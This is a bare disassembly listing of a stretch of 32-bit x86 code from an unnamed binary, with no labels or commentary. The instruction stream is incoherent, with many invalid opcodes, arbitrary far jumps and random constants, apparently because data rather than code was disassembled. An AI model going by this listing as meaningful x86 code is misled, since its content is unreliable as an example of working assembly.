  42872f:	outs   dx,DWORD PTR ds:[esi]
  428730:	xchg   ebp,eax
  428731:	push   esi
  428732:	rcr    BYTE PTR [edi],1
  428734:	ds lahf 
  428736:	push   ss
  428737:	shl    ecx,1
  428739:	sbb    eax,0xa4453af6
  42873e:	sti    
  42873f:	pop    eax
  428740:	ret    0x0
	...
  4287b3:	add    BYTE PTR [edx],bl
  4287b5:	mov    cl,BYTE PTR [ebx]
  4287b7:	inc    ebp
  4287b8:	fwait
  4287b9:	lds    ebx,FWORD PTR [esi-0x21]
  4287bc:	xor    edi,DWORD PTR [edx+0x40ae299e]
  4287c2:	ins    DWORD PTR es:[edi],dx
  4287c3:	mov    esp,0x1ad91
  4287c8:	cmc    
  4287c9:	add    BYTE PTR [eax],al
  4287cb:	add    BYTE PTR [ebx-0x21],cl
  4287ce:	mov    bh,0x5c
  4287d0:	dec    eax
  4287d1:	aad    0x9
  4287d3:	push   ds
  4287d4:	xchg   esp,eax
  4287d5:	outs   dx,BYTE PTR ds:[esi]
  4287d6:	xchg   ecx,eax
  4287d7:	rcl    ecx,1
  4287d9:	call   0x2fb7:0x246c2e33
  4287e0:	inc    ecx
  4287e1:	imul   ecx,DWORD PTR [ebx+esi*4-0x4cfa2105],0xffffffff
  4287e9:	lock push esi
  4287eb:	sbb    DWORD PTR [edi-0x2a4f43a3],0xffffff8b
  4287f2:	xor    BYTE PTR [edi],ch
  4287f4:	mov    ecx,DWORD PTR [ebx+0x19]
  4287f7:	sub    eax,0x644dde6e
  4287fc:	(bad)  
  4287fd:	adc    DWORD PTR [edi+0x5e36307d],ebp
  428803:	ror    BYTE PTR [ebx-0x62],0xcb
  428807:	test   BYTE PTR [edx-0x59],bl
  42880a:	xor    BYTE PTR [eax+ecx*4-0x272f2354],dl
  428811:	dec    esp
  428812:	pop    eax
  428813:	jne    0x428886
  428815:	cdq    
  428816:	stos   BYTE PTR es:[edi],al
  428817:	fnsave [edi]
  428819:	lds    ebx,FWORD PTR [edx+0x6e]
  42881c:	adc    edi,DWORD PTR [edi-0x64a7d8ac]
  428822:	dec    ecx
  428823:	cld    
  428824:	shl    BYTE PTR [esp+ecx*1+0x3ba21c5b],cl
  42882b:	rcr    DWORD PTR [edi+0x61],0x9c
  42882f:	mov    eax,0xdbeb2885
  428834:	aas    
  428835:	xchg   BYTE PTR [esp+ecx*4+0x23fbdecd],cl
  42883c:	jmp    0x42888f
  42883e:	rol    BYTE PTR [ebx],cl
  428840:	push   esi
  428841:	cld    
  428842:	cmc    
  428843:	test   eax,0x1cceee43
  428848:	pop    ebx
  428849:	call   0x75001e02
  42884e:	cmp    DWORD PTR [ebp+0xe],0xfffffffa
  428852:	dec    ebx
  428853:	pop    ds
  428854:	mov    ds:0x71a60305,al
  428859:	ds jmp 0x42886f
  42885c:	mov    cl,0x50
  42885e:	pop    eax
  42885f:	loopne 0x42885f
  428861:	mov    dl,0x94
  428863:	retf   0x88ac
  428866:	call   0x141cbc5
  42886b:	sbb    ch,dh
  42886d:	push   esp
  42886e:	jne    0x428843
  428870:	idiv   ebx
  428872:	push   es
  428873:	mov    ds:0x4a502bac,al
  428878:	(bad)  
  428879:	xchg   esp,eax
  42887a:	mov    bh,BYTE PTR [esi-0x6b]
  42887d:	xchg   ebp,eax
  42887e:	(bad)  
  42887f:	ret    
  428880:	pushf  
  428881:	inc    esi
  428882:	adc    BYTE PTR [edx],ch
  428884:	retf   0x7827
  428887:	mov    ebp,0xdb7b97d7
  42888c:	(bad)  
  42888d:	inc    DWORD PTR [ebp+0x290a0ea0]
  428893:	add    edi,edx
  428895:	out    0x21,eax
  428897:	lds    esi,FWORD PTR [ecx-0x276a37a1]
  42889d:	test   BYTE PTR [esi],0x5
  4288a0:	arpl   WORD PTR [edi+0x3751f30f],bp
  4288a6:	mov    ah,0x49
  4288a8:	xchg   ebp,eax
  4288a9:	dec    edx
  4288aa:	jo     0x42886f
  4288ac:	xlat   BYTE PTR ds:[ebx]
  4288ad:	cmp    cl,BYTE PTR [esi+ebp*1+0x1db4dec4]
  4288b4:	add    esi,DWORD PTR [ecx-0x32]
  4288b7:	out    0xa6,al
  4288b9:	mov    dh,0x37
  4288bb:	lock cmc 
  4288bd:	scas   eax,DWORD PTR es:[edi]
  4288be:	loop   0x4288fd
	...
  428934:	call   0xdea3:0xffa3ffdd
  42893b:	std    
  42893c:	clc    
  42893d:	jns    0x4289b6
  42893f:	jmp    0xae86:0xb492a6c7
  428946:	add    DWORD PTR [eax],eax
  428948:	cmc    
  428949:	add    BYTE PTR [eax],al
  42894b:	add    bh,bl
  42894d:	inc    ebx
  42894e:	mov    ds:0x677d7024,eax
  428953:	cs test al,0xe
  428956:	sbb    edx,esi
  428958:	mov    dl,0x52
  42895a:	cmp    al,0x84
  42895c:	stos   DWORD PTR es:[edi],eax
  42895d:	loope  0x428913
  42895f:	pop    ebx
  428960:	ja     0x428936
  428962:	mov    al,0x2f
  428964:	cli    
  428965:	stos   DWORD PTR es:[edi],eax
  428966:	sbb    BYTE PTR [esi+0x24],dl
  428969:	test   DWORD PTR ds:[ebp-0x54],esi
  42896d:	push   eax
  42896e:	mov    dl,0x73
  428970:	pop    eax
  428971:	dec    edi
  428972:	int    0x5c
  428974:	jo     0x42898c
  428976:	sub    ebp,esi
  428978:	pop    esp
  428979:	pop    ebp
  42897a:	xchg   esp,eax
  42897b:	popa   
  42897c:	mov    ebp,0x89b4cc6c
  428981:	mov    dl,0x59
  428983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428984:	nop
  428985:	xchg   ebp,eax
  428986:	ficomp DWORD PTR [edx+0x5d]
  428989:	lock pop ss
  42898b:	mov    WORD PTR [edi-0x245e2e0c],ss
  428991:	inc    ebp
  428992:	inc    al
  428994:	cmp    al,0xc2
  428996:	dec    edi
  428997:	push   cs
  428998:	pop    ss
  428999:	cmc    
  42899a:	scas   eax,DWORD PTR es:[edi]
  42899b:	xchg   esi,eax
  42899c:	in     al,dx
  42899d:	inc    esp
  42899e:	(bad)  
  42899f:	xor    DWORD PTR [ebp+0x5d24a64e],ebx
  4289a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4289a6:	dec    ecx
  4289a7:	and    edi,edi
  4289a9:	daa    
  4289aa:	ins    DWORD PTR es:[edi],dx
  4289ab:	imul   edx,esp,0x4d
  4289ae:	cmc    
  4289af:	mov    edi,0xaa33d9
  4289b4:	cmp    BYTE PTR [edi-0x58ad9399],ah
  4289ba:	xor    BYTE PTR [ecx-0x7fa440b],cl
  4289c0:	push   cs
  4289c1:	lahf   
  4289c2:	sbb    DWORD PTR [edx-0x2da1f6a4],esp
  4289c8:	dec    eax
  4289c9:	xor    al,0x61
  4289cb:	xchg   edx,eax
  4289cc:	inc    esp
  4289cd:	call   0x29e8d01e
  4289d2:	nop
  4289d3:	shr    ah,1
  4289d5:	mov    esi,0x2defa707
  4289da:	stc    
  4289db:	std    
  4289dc:	mov    cl,0xd0
  4289de:	sti    
  4289df:	xchg   esi,eax
  4289e0:	mov    ch,0x76
  4289e2:	ins    DWORD PTR es:[edi],dx
  4289e3:	inc    eax
  4289e4:	(bad)  
  4289e5:	pop    ecx
  4289e6:	cmp    edi,DWORD PTR [eax-0x17]
  4289e9:	aaa    
  4289ea:	sub    DWORD PTR [edx+0x175a699c],eax
  4289f0:	bound  edx,QWORD PTR [ecx]
  4289f2:	(bad)  
  4289f3:	call   0x8672:0xb76c2b83
  4289fa:	xchg   ebp,ecx
  4289fc:	xchg   esp,eax
  4289fd:	sub    esi,DWORD PTR [esi]
  4289ff:	sar    BYTE PTR [edx-0x4e],0x95
  428a03:	sbb    ah,BYTE PTR [esi-0x5e8c7266]
  428a09:	arpl   bx,bx
  428a0b:	leave  
  428a0c:	add    DWORD PTR [edi-0x272219dc],edx
  428a12:	mov    ah,0x94
  428a14:	mov    esp,0x9f172c54
  428a19:	and    DWORD PTR [eax+eax*1+0x412c6f9e],esi
  428a20:	or     al,0xf8
  428a22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428a23:	bound  edi,QWORD PTR [esi+eax*8+0xb6e6818]
  428a2a:	pop    ebx
  428a2b:	data16 add cl,BYTE PTR [ebx-0x45376850]
  428a32:	out    0x72,eax
  428a34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428a35:	mov    ecx,DWORD PTR [edx+0x2ca34d1d]
  428a3b:	mul    BYTE PTR [ecx+0x7d3e71e9]
	...
  428ab1:	add    BYTE PTR [eax],al
  428ab3:	add    dl,cl
  428ab5:	mov    edx,DWORD PTR [edx+0x7b]
  428ab8:	push   ebx
  428ab9:	sti    
  428aba:	jmp    0x428a77
  428abc:	xchg   ebp,eax
  428abd:	sub    eax,0x84bef691
  428ac2:	add    eax,0x1af7bd3
  428ac7:	add    ch,dh
  428ac9:	add    BYTE PTR [eax],al
  428acb:	add    dl,ah
  428acd:	jnp    0x428ac3
  428acf:	cs mov dl,0xfd
  428ad2:	xchg   ebp,ecx
  428ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ad5:	push   esp
  428ad6:	(bad)  
  428ad7:	pop    es
  428ad8:	cmp    al,0x14
  428ada:	dec    ebp
  428adb:	call   0x66eb27aa
  428ae0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ae1:	adc    al,0x6c
  428ae3:	or     BYTE PTR [edi],al
  428ae5:	push   eax
  428ae6:	jns    0x428a8d
  428ae8:	xor    cl,BYTE PTR [esi-0x64]
  428aeb:	xchg   BYTE PTR [esi],bh
  428aed:	imul   ecx
  428aef:	mov    ah,BYTE PTR [eax]
  428af1:	gs mov dl,0xab
  428af4:	jmp    0xcf89:0x605d072
  428afb:	or     DWORD PTR [edx],ebx
  428afd:	cdq    
  428afe:	xchg   esp,eax
  428aff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b00:	mov    al,0x9d
  428b02:	pop    eax
  428b03:	hlt    
  428b04:	popf   
  428b05:	jecxz  0x428b5d
  428b07:	xor    DWORD PTR [ecx+0x6b],edi
  428b0a:	fcmovbe st,st(1)
  428b0c:	xor    cl,BYTE PTR [edi+0x74821081]
  428b12:	and    dl,bh
  428b14:	popf   
  428b15:	push   0xffffff8a
  428b17:	and    cl,bh
  428b19:	or     eax,0x2c540f32
  428b1e:	sbb    BYTE PTR [ecx-0x1cf469aa],0x96
  428b25:	dec    ecx
  428b26:	scas   eax,DWORD PTR es:[edi]
  428b27:	push   ss
  428b28:	push   ebx
  428b29:	or     ch,BYTE PTR [eax-0x7b]
  428b2c:	mov    ah,BYTE PTR [esi-0x7c00b82f]
  428b32:	or     al,0x10
  428b34:	ret    
  428b35:	das    
  428b36:	retf   
  428b37:	rep stos BYTE PTR es:[edi],al
  428b39:	mov    bh,0xe3
  428b3b:	sub    eax,0xd59afb5e
  428b40:	loopne 0x428b05
  428b42:	in     al,0x67
  428b44:	test   al,0x63
  428b46:	mov    ebp,0x88452131
  428b4b:	into   
  428b4c:	pop    esp
  428b4d:	or     ah,cl
  428b4f:	sub    ebx,eax
  428b51:	pop    ebp
  428b52:	std    
  428b53:	popf   
  428b54:	mov    edx,0x1670b541
  428b59:	fisub  DWORD PTR [ebx-0x9]
  428b5c:	leave  
  428b5d:	pop    esi
  428b5e:	in     al,dx
  428b5f:	cmc    
  428b60:	xor    al,0x88
  428b62:	stos   DWORD PTR es:[edi],eax
  428b63:	fxch   st(4)
  428b65:	clc    
  428b66:	mov    DWORD PTR [esi-0x3902035c],eax
  428b6c:	add    bl,BYTE PTR ds:0xa4fd77ad
  428b72:	mov    ebp,0xdc7357
  428b77:	mov    bh,0xc5
  428b79:	pop    DWORD PTR [eax+0x4e]
  428b7c:	sub    BYTE PTR [edi+0xe],0x34
  428b80:	in     al,dx
  428b81:	sub    al,0xa8
  428b83:	sbb    esp,DWORD PTR [edi]
  428b85:	mov    edi,0x701744d8
  428b8a:	dec    DWORD PTR [edx+0x66c64483]
  428b90:	loope  0x428c11
  428b92:	bound  ebx,QWORD PTR [edi+0x3c8e4322]
  428b98:	xchg   esp,eax
  428b99:	fisub  DWORD PTR [ecx+0x5d]
  428b9c:	into   
  428b9d:	inc    eax
  428b9e:	fadd   QWORD PTR [ebx]
  428ba0:	dec    esi
  428ba1:	ja     0x428be5
  428ba3:	es xchg edx,eax
  428ba5:	cmp    ebx,DWORD PTR ds:0xad1f48c2
  428bab:	push   es
  428bac:	jne    0x428b63
  428bae:	cmp    BYTE PTR [esi-0x39],0xf
  428bb2:	std    
  428bb3:	gs ds jp 0x428b7b
  428bb7:	loop   0x428b5a
  428bb9:	aaa    
  428bba:	pop    ds
  428bbb:	inc    edx
  428bbc:	mov    bh,0x17
  428bbe:	test   BYTE PTR [esi-0x80],bl
	...
  428c31:	add    BYTE PTR [eax],al
  428c33:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  428c39:	jecxz  0x428c2e
  428c3b:	lock mov ebx,0x18d7a28f
  428c41:	test   eax,0xb070658c
  428c46:	add    DWORD PTR [eax],eax
  428c48:	cmc    
  428c49:	add    BYTE PTR [eax],al
  428c4b:	add    BYTE PTR [ebx-0x31],cl
  428c4e:	mov    ds:0x482b9c8a,al
  428c53:	(bad)  
  428c54:	mov    esi,0x853f4790
  428c59:	scas   al,BYTE PTR es:[edi]
  428c5a:	jno    0x428cba
  428c5c:	fcomp  QWORD PTR [eax+0x1e929a68]
  428c62:	clc    
  428c63:	adc    al,0x87
  428c65:	fs xor edx,ebx
  428c68:	xlat   BYTE PTR ds:[ebx]
  428c69:	inc    ebx
  428c6a:	xchg   esi,ebx
  428c6c:	push   edi
  428c6d:	adc    DWORD PTR [edi-0x34],edi
  428c70:	(bad)  [edx]
  428c72:	jo     0x428ccd
  428c74:	data16 (bad) 
  428c76:	jmp    0x9a02:0xfd88e61a
  428c7d:	pop    ss
  428c7e:	xchg   esi,eax
  428c7f:	addr16 xchg ebp,eax
  428c81:	in     al,dx
  428c82:	adc    eax,0x6c0836e6
  428c87:	inc    esp
  428c88:	jmp    0x428c52
  428c8a:	ret    0x466f
  428c8d:	sbb    ch,BYTE PTR [esi+0x50]
  428c90:	jg     0x428c2f
  428c92:	aaa    
  428c93:	lahf   
  428c94:	sbb    BYTE PTR [eax+0x4],ch
  428c97:	pop    ebp
  428c98:	fisub  WORD PTR [esi]
  428c9a:	mov    ?,WORD PTR [ecx+0x140a2858]
  428ca0:	sub    al,0xf
  428ca2:	cmp    ecx,ebx
  428ca4:	push   cs
  428ca5:	xchg   BYTE PTR [ebx],al
  428ca7:	push   eax
  428ca8:	test   DWORD PTR [esi+0x33],0xa3bfcf7a
  428caf:	jg     0x428cd4
  428cb1:	popf   
  428cb2:	add    eax,0xfff8c609
  428cb7:	imul   ecx,DWORD PTR [ebx+0x37],0x46904ed8
  428cbe:	jnp    0x428ca9
  428cc0:	in     eax,dx
  428cc1:	push   si
  428cc3:	cdq    
  428cc4:	in     al,dx
  428cc5:	pop    ss
  428cc6:	push   ebp
  428cc7:	inc    ebp
  428cc8:	int    0xe4
  428cca:	sbb    DWORD PTR [ecx-0x1],edx
  428ccd:	push   edi
  428cce:	push   cs
  428ccf:	jns    0x428d02
  428cd1:	scas   al,BYTE PTR es:[edi]
  428cd2:	xor    ebx,DWORD PTR [edx+0x53]
  428cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cd6:	sar    BYTE PTR [esi+ebx*8],cl
  428cd9:	shl    BYTE PTR [eax-0x608997d5],cl
  428cdf:	enter  0xbb79,0xab
  428ce3:	es inc ebx
  428ce5:	or     al,0xf6
  428ce7:	xchg   DWORD PTR [edx-0x53],edx
  428cea:	xor    eax,0xb3def15e
  428cef:	adc    al,0xa0
  428cf1:	bound  esp,QWORD PTR [ecx-0x1b]
  428cf4:	aam    0x43
  428cf6:	xchg   edi,ecx
  428cf8:	inc    eax
  428cf9:	mov    dh,0x3
  428cfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cfc:	(bad)  
  428cfd:	mov    DWORD PTR [ebp-0x19],esp
  428d00:	mov    eax,ds:0x5d9d07b8
  428d05:	push   es
  428d06:	pop    ebp
  428d07:	test   DWORD PTR [edx],eax
  428d09:	jge    0x428d53
  428d0b:	dec    edx
  428d0c:	adc    ah,bh
  428d0e:	ja     0x428d4d
  428d10:	das    
  428d11:	retf   
  428d12:	xlat   BYTE PTR ds:[ebx]
  428d13:	sub    al,0x55
  428d15:	jne    0x428cb6
  428d17:	xchg   esp,eax
  428d18:	stc    
  428d19:	push   0x5c
  428d1b:	push   esi
  428d1c:	popa   
  428d1d:	call   0x803950be
  428d22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428d23:	inc    esp
  428d24:	and    eax,0x33131784
  428d29:	xchg   ecx,eax
  428d2a:	mov    bl,0xb3
  428d2c:	xor    BYTE PTR [eax+0x74],ah
  428d2f:	pop    es
  428d30:	mov    ch,cl
  428d32:	out    0x74,eax
  428d34:	lahf   
  428d35:	fwait
  428d36:	pop    ecx
  428d37:	push   ebx
  428d38:	or     ebp,DWORD PTR [edi-0x49bd5b49]
  428d3e:	fdivr  QWORD PTR [edi+0xc5]
	...
  428db4:	mov    eax,0x6d3c25f1
  428db9:	cld    
  428dba:	mov    ecx,0x195a21f5
  428dbf:	test   eax,0xfca7e78
  428dc4:	gs mov cl,0x1
  428dc7:	add    ch,dh
  428dc9:	add    BYTE PTR [eax],al
  428dcb:	add    BYTE PTR [esi-0x19],ah
  428dce:	inc    edi
  428dcf:	lea    eax,[ecx-0x7b]
  428dd2:	push   eax
  428dd3:	and    esp,DWORD PTR [ecx+0x177b5895]
  428dd9:	ss test al,0xed
  428ddc:	(bad)  
  428ddd:	ins    DWORD PTR es:[edi],dx
  428dde:	(bad)  
  428ddf:	xor    BYTE PTR [edi-0x1b7b0479],ch
  428de5:	adc    dh,cl
  428de7:	sub    edx,ecx
  428de9:	push   ds
  428dea:	sbb    dl,BYTE PTR [edi]
  428dec:	stos   DWORD PTR es:[edi],eax
  428ded:	jge    0x428d7c
  428def:	iret   
  428df0:	mov    WORD PTR [ebx+0x57],ss
  428df3:	pop    ebx
  428df4:	mov    al,ds:0x2a393cda
  428df9:	mov    ebx,0xf5244de4
  428dfe:	inc    edx
  428dff:	and    DWORD PTR [edx],0xf98dffe8
  428e05:	leave  
  428e06:	ins    BYTE PTR es:[edi],dx
  428e07:	out    0xcd,al
  428e09:	mov    dh,0x7d
  428e0b:	bound  edi,QWORD PTR [ebx+eiz*2-0x3c]
  428e0f:	and    BYTE PTR [ebx],bl
  428e11:	jo     0x428dca
  428e13:	js     0x428e56
  428e15:	lods   eax,DWORD PTR ds:[esi]
  428e16:	and    ch,BYTE PTR [edi+0x789d9472]
  428e1c:	add    ch,BYTE PTR [eax]
  428e1e:	or     edx,DWORD PTR [eax]
  428e20:	pop    edx
  428e21:	push   edi
  428e22:	xor    ecx,edx
  428e24:	cmp    ah,dl
  428e26:	pop    eax
  428e27:	out    0x5f,al
  428e29:	pop    ebx
  428e2a:	dec    edx
  428e2b:	adc    DWORD PTR [ebx+0xf0d73b0],0x24
  428e32:	add    dh,bl
  428e34:	pop    esi
  428e35:	inc    esp
  428e36:	mov    ds:0x3b52e187,al
  428e3b:	clc    
  428e3c:	push   ss
  428e3d:	gs cli 
  428e3f:	pop    ebp
  428e40:	sbb    eax,0x4490a565
  428e45:	je     0x428e32
  428e47:	xor    esi,DWORD PTR [ebp-0x52cb6d04]
  428e4d:	pop    ss
  428e4e:	push   esp
  428e4f:	dec    ebx
  428e50:	out    0xec,al
  428e52:	pop    dx
  428e54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e55:	pop    eax
  428e56:	inc    esi
  428e57:	mov    dh,0x86
  428e59:	hlt    
  428e5a:	xor    edx,DWORD PTR [ecx+0x1d]
  428e5d:	(bad)  
  428e5e:	cmp    eax,0xec1a22fd
  428e63:	and    bl,BYTE PTR [edi]
  428e65:	leave  
  428e66:	dec    eax
  428e67:	push   edx
  428e68:	adc    cl,al
  428e6a:	faddp  st(6),st
  428e6c:	xor    edx,DWORD PTR [edx]
  428e6e:	xchg   BYTE PTR [edx-0x36929e7a],bh
  428e74:	lds    esi,FWORD PTR [ebx-0x78905998]
  428e7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e7b:	jmp    0x90b8:0x5728ad74
  428e82:	cmp    BYTE PTR [edx+0x11],cl
  428e85:	or     ebx,ecx
  428e87:	(bad)  
  428e88:	(bad)  [eax-0x189eb43b]
  428e8e:	push   cs
  428e8f:	or     al,0x39
  428e91:	jg     0x428e4e
  428e93:	or     al,0xb0
  428e95:	xor    BYTE PTR [ecx-0x18],ch
  428e98:	(bad)  
  428e99:	bound  ecx,QWORD PTR [edx]
  428e9b:	push   ebp
  428e9c:	int    0xbb
  428e9e:	adc    al,0x13
  428ea0:	popa   
  428ea1:	ret    
  428ea2:	push   ebp
  428ea3:	dec    esi
  428ea4:	jno    0x428e4e
  428ea6:	add    DWORD PTR [esi],0x36d8a29f
  428eac:	xor    cl,al
  428eae:	xlat   BYTE PTR ds:[ebx]
  428eaf:	jecxz  0x428e91
  428eb1:	xlat   BYTE PTR ds:[ebx]
  428eb2:	clc    
  428eb3:	and    al,0x95
  428eb5:	jmp    0xa75f3a64
  428eba:	and    cl,ch
  428ebc:	rcl    DWORD PTR [eax-0x4c],cl
  428ebf:	(bad)  
  428ec0:	sldt   WORD PTR [eax]
	...
  428f33:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  428f39:	out    dx,eax
  428f3a:	cmc    
  428f3b:	mov    edi,0x37e5e17c
  428f40:	push   ss
  428f41:	mov    edx,edx
  428f43:	rcr    BYTE PTR [edx-0x4e],cl
  428f46:	add    DWORD PTR [eax],eax
  428f48:	cmc    
  428f49:	add    BYTE PTR [eax],al
  428f4b:	add    BYTE PTR [edx+0x6c],ch
  428f4e:	fsub   QWORD PTR [ebp-0x708e868f]
  428f54:	rol    BYTE PTR [edi-0x150d0d78],cl
  428f5a:	(bad)  
  428f5b:	jae    0x428fd0
  428f5d:	or     ch,BYTE PTR [esi-0x9]
  428f60:	mov    cl,0xbd
  428f62:	mov    dl,0x3e
  428f64:	rol    BYTE PTR [ecx+0x193d2d46],0x4
  428f6b:	jns    0x428f5e
  428f6d:	fmul   QWORD PTR [edx-0x6f89bd53]
  428f73:	adc    eax,0x260eb46b
  428f78:	rol    al,cl
  428f7a:	lods   eax,DWORD PTR ds:[esi]
  428f7b:	mov    cl,0xc4
  428f7d:	pop    ds
  428f7e:	sub    eax,0xff7dd9d
  428f83:	jp     0x428fd3
  428f85:	inc    ecx
  428f86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428f88:	jae    0x428fe6
  428f8a:	mov    al,ds:0xdc8454a3
  428f8f:	adc    cl,bl
  428f91:	(bad)  
  428f92:	sti    
  428f93:	icebp  
  428f94:	loop   0x428f9b
  428f96:	or     ebx,ecx
  428f98:	leave  
  428f99:	mov    bh,0x1c
  428f9b:	outs   dx,DWORD PTR ds:[esi]
  428f9c:	mov    al,ds:0x318b9557
  428fa1:	jnp    0x429003
  428fa3:	dec    edi
  428fa4:	jne    0x428f95
  428fa6:	es ret 0x815a
  428faa:	push   ds
  428fab:	and    bh,ah
  428fad:	add    eax,0x7d9c5484
  428fb2:	and    DWORD PTR [ebx+0x773616d4],edi
  428fb8:	adc    BYTE PTR [ecx-0x5a],dl
  428fbb:	loop   0x429006
  428fbd:	adc    ecx,ebp
  428fbf:	xor    bl,BYTE PTR [edi+ecx*1-0x48199ad4]
  428fc6:	mov    ch,0x39
  428fc8:	sbb    DWORD PTR gs:[ecx-0x14],eax
  428fcc:	add    al,0xc7
  428fce:	cs hlt 
  428fd0:	test   DWORD PTR [edx+0x2eed4d47],0x1ac89510
  428fda:	jae    0x428f75
  428fdc:	xor    al,0x5b
  428fde:	lds    esp,FWORD PTR [ecx-0x74]
  428fe1:	jle    0x428fce
  428fe3:	jl     0x8d52e04d
  428fe9:	push   ds
  428fea:	(bad)  
  428fed:	test   al,0x95
  428fef:	jecxz  0x428fe4
  428ff1:	in     al,0x5a
  428ff3:	dec    ecx
  428ff4:	or     ch,BYTE PTR [ebp+0x3b]
  428ff7:	cmp    eax,0xeffe82b9
  428ffc:	xor    al,0x90
  428ffe:	xchg   esp,eax
  428fff:	and    bl,bh
  429001:	test   DWORD PTR [eax*8+0x55b09501],esp
  429008:	pcmpgtw mm1,QWORD PTR [ebp-0x32]
  42900c:	xchg   ebx,eax
  42900d:	mov    ah,0xed
  42900f:	fistp  WORD PTR [edi+0x5028e6ac]
  429015:	mov    al,ds:0x1f560593
  42901a:	out    dx,eax
  42901b:	imul   ebx,DWORD PTR [ecx+ebx*2+0x71],0xffffffc1
  429020:	add    esp,0x28d64b76
  429026:	sbb    eax,0xc748ca0a
  42902b:	int3   
  42902c:	pop    esi
  42902d:	pop    DWORD PTR [esi+0x35]
  429030:	mov    dl,0xb7
  429032:	xchg   ebp,eax
  429033:	loopne 0x4290a1
  429035:	shl    BYTE PTR [eax+ebp*8-0x18],1
  429039:	jmp    0x91f1:0x88651955
  429040:	cld    
	...
  4290b1:	add    BYTE PTR [eax],al
  4290b3:	add    bh,bl
  4290b5:	out    dx,al
  4290b6:	std    
  4290b7:	dec    esp
  4290b8:	std    
  4290b9:	pop    edi
  4290ba:	(bad)  
  4290bb:	(bad)  
  4290bc:	mov    edi,0xd1b66cf7
  4290c1:	push   es
  4290c2:	bound  ecx,QWORD PTR [edi]
  4290c4:	dec    edi
  4290c5:	mov    bl,0x1
  4290c7:	add    ch,dh
  4290c9:	add    BYTE PTR [eax],al
  4290cb:	add    BYTE PTR [esi+0x6851c3ae],al
  4290d1:	inc    ebp
  4290d2:	leave  
  4290d3:	test   dh,bh
  4290d5:	and    BYTE PTR [edx+0x361ab5b0],0x51
  4290dc:	rcr    BYTE PTR [ebp-0x1a55ea1e],0x4e
  4290e3:	or     BYTE PTR [esi-0x4e],bh
  4290e6:	sbb    eax,0x37ad8120
  4290eb:	popa   
  4290ec:	push   ebp
  4290ed:	lods   eax,DWORD PTR ds:[esi]
  4290ee:	sub    edx,edi
  4290f0:	jg     0x429139
  4290f2:	(bad)  
  4290f3:	and    eax,0xe2829821
  4290f8:	mov    edx,0xda1ea66a
  4290fd:	aam    0x75
  4290ff:	(bad)  
  429100:	xchg   esp,eax
  429101:	pop    ecx
  429102:	mov    ch,0x6
  429104:	xor    eax,0x79b3263e
  429109:	mov    ds:0x5a75edb7,eax
  42910e:	sub    ah,bl
  429110:	adc    BYTE PTR [edx],bh
  429112:	mov    edx,0x94ede4b0
  429117:	pop    edi
  429118:	mov    dl,0x6a
  42911a:	sub    BYTE PTR [ecx-0x5bebf32a],ah
  429120:	cwde   
  429121:	loop   0x429103
  429123:	mov    dh,bl
  429125:	nop
  429126:	push   edi
  429127:	inc    ebp
  429128:	and    BYTE PTR ds:0xe47b19c5,0x85
  42912f:	inc    eax
  429130:	jo     0x42912f
  429132:	dec    edi
  429133:	ins    DWORD PTR es:[edi],dx
  429134:	sub    eax,0x7556c7bc
  429139:	jne    0x4290ff
  42913b:	mov    al,0x39
  42913d:	xchg   edi,eax
  42913e:	data16 gs out 0xa2,al
  429142:	push   ebp
  429143:	shr    BYTE PTR [ebx+0x6c16b257],0xfb
  42914a:	xchg   edi,eax
  42914b:	jno    0x4291ae
  42914d:	xlat   BYTE PTR ds:[ebx]
  42914e:	cmc    
  42914f:	cmp    edx,esi
  429151:	call   0x9f7a3aa
  429156:	jae    0x4290ec
  429158:	push   ds
  429159:	xchg   ecx,eax
  42915a:	sbb    al,0x14
  42915c:	add    al,0x70
  42915e:	sbb    DWORD PTR [ebx-0x65fa8a34],0x5f
  429165:	retf   0x6f0d
  429168:	in     al,dx
  429169:	or     al,0x75
  42916b:	loopne 0x429168
  42916d:	inc    esp
  42916e:	fimul  WORD PTR [eax-0x83aa386]
  429174:	inc    esp
  429175:	pusha  
  429176:	adc    ecx,DWORD PTR [ebp+0x6f]
  429179:	pop    ss
  42917a:	mov    ebp,0x6203faa1
  42917f:	jne    0x42911a
  429181:	jno    0x42916b
  429183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429184:	xchg   esi,eax
  429185:	mov    edi,0xd870a34a
  42918a:	xchg   esi,eax
  42918b:	test   BYTE PTR [ebp-0x73b65ded],dl
  429191:	cmp    BYTE PTR [esi],dl
  429193:	jno    0x4291d3
  429195:	fisttp DWORD PTR [eax]
  429197:	lds    esp,FWORD PTR [esi-0x68637193]
  42919d:	push   0x7bb67628
  4291a2:	dec    ebx
  4291a3:	mov    dh,0x30
  4291a5:	sahf   
  4291a6:	push   0x4c
  4291a8:	xor    cl,BYTE PTR [ecx-0x7c403aa2]
  4291ae:	jnp    0x42913e
  4291b0:	push   ecx
  4291b1:	inc    edx
  4291b2:	imul   esi,DWORD PTR [ecx],0x40
  4291b5:	pop    ecx
  4291b6:	shr    cl,cl
  4291b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4291b9:	jl     0x4291e3
  4291bb:	ficom  DWORD PTR [ebp+0x54dca23b]
	...
  429231:	add    BYTE PTR [eax],al
  429233:	add    bh,al
  429235:	fidiv  WORD PTR [esi]
  429237:	loop   0x429278
  429239:	jmp    0x67eb:0x13f5ffd7
  429240:	inc    ebp
  429241:	sahf   
  429242:	out    0x19,al
  429244:	inc    esp
  429245:	mov    ah,0x1
  429247:	add    ch,dh
  429249:	add    BYTE PTR [eax],al
  42924b:	add    BYTE PTR [ecx],al
